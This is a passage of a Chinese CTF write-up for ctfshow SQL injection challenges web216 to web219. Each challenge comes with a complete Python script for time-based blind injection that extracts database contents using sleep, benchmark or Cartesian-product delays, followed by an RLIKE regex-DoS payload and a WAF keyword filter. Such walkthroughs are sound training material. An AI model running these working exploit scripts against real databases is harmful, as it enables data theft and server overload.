</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web216">web216<a hidden class="anchor" aria-hidden="true" href="#web216">#</a></h4>
<p><img alt="image-20250214122109700" loading="lazy" src="../assets/image-20250214122109700.png"></p>
<p>构造闭合即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://d3d3aa4e-87f5-454c-b589-826971f59bbb.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查列名</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxcc&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 爆字段</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaac from ctfshow_flagxcc&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;&#39;&#39;) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(1),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web217">web217<a hidden class="anchor" aria-hidden="true" href="#web217">#</a></h4>
<p><img alt="image-20250214145642775" loading="lazy" src="../assets/image-20250214145642775.png"></p>
<p>这题waf了sleep</p>
<p>可以改用benchmark</p>
<blockquote>
<ul>
<li>在 MySQL 中，<code>benchmark</code>函数用于测试表达式执行的性能。它的语法是<code>benchmark(count,expr)</code>，其中<code>count</code>是要执行<code>expr</code>的次数，<code>expr</code>是要测试的表达式。</li>
<li>例如，<code>benchmark(10000000,sha(1))</code>表示将<code>sha(1)</code>这个表达式执行 10000000 次。<code>sha(1)</code>是计算字符串<code>'1'</code>的 SHA - 1 哈希值。</li>
</ul></blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://b5d4a386-1612-4c40-b14c-e9103a54188c.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># 查数据库</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># 查列名字</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxccb&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># 查数据</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabc from ctfshow_flagxccb&#34;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,benchmark(1000000,sha(1)),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.33</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>benchmark的设置比较苛刻，要多试试</p>
<p>最好不要设置太大，环境会崩</p>
<h4 id="web218">web218<a hidden class="anchor" aria-hidden="true" href="#web218">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">       <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="c1">//屏蔽危险分子
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"></span>    <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/sleep|benchmark/i&#39;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">}</span>   
</span></span><span class="line"><span class="ln">11</span><span class="cl">      
</span></span></code></pre></div><p>这题sleep和benchmark都被ban掉了</p>
<p>可以考虑用笛卡尔积盲注</p>
<p>参考文章：<a href="https://cloud.tencent.com/developer/article/1601686">SQL注入经验-大负荷注入-腾讯云开发者社区-腾讯云</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a17ea2c9-7463-4d5a-bfa5-2f6bdcd2daf1.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = &#34;select table_name from information_schema.tables where table_schema=database() limit 0,1&#34;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxc&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaac from ctfshow_flagxc&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,(select count(*) from information_schema.columns A, information_schema.columns B),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.15</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="c1"># ctfshow{d317911f-ac1e-4160-be70-47d01a0f2f45}</span>
</span></span></code></pre></div><p>乱码的话，多跑几次就好了</p>
<p>另一种方法就是通过正则 DOS RLIKE注入</p>
<p>利用 SQL 多次计算正则消耗计算资源产生延时效果，与 benchmark 原理类似，通过 rpad 或 repeat 构造长字符串，以计算量大的 pattern。</p>
<pre tabindex="0"><code>debug=1&amp;ip=repeat(rpad(&#39;a&#39;, 999999, &#39;a&#39;),16) rlike concat(repeat(&#39;(a.*)+&#39;,14), &#39;b&#39;)
</code></pre><h4 id="web219">web219<a hidden class="anchor" aria-hidden="true" href="#web219">#</a></h4>
<pre tabindex="0"><code>查询语句

       where id = ($id);
      
返回逻辑

    //屏蔽危险分子
    function waf($str){
        return preg_match(&#39;/sleep|benchmark|rlike/i&#39;,$str);
    }   
      
</code></pre><p>继续使用笛卡尔积盲注即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://61d55d79-847e-43d7-80e4-c221ceae9f4a.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = &#34;select table_name from information_schema.tables where table_schema=database() limit 0,1&#34;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxca&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabc from ctfshow_flagxca&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,(select count(*) from information_schema.columns A, information_schema.columns B),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
